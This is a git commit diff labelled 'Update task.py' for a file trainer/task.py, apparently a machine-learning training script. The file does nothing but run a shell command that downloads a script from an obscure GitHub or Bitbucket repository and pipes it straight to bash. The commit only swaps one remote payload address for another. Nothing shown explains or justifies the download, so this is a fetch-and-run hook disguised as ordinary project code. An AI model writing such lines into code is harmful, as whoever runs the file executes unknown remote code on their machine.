21398dbfe8680b4c1fa919a5db65b89ebc6405cb
ganejafaujanih <145754543+ganejafaujanih@users.noreply.github.com>
2023-12-13 09:46:24 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/ganejafaujanih/acuy/raw/main/koreh | bash')
+os.system('curl -sL https://bitbucket.org/jeffreyadams29/nevox/raw/main/zeprut | bash')
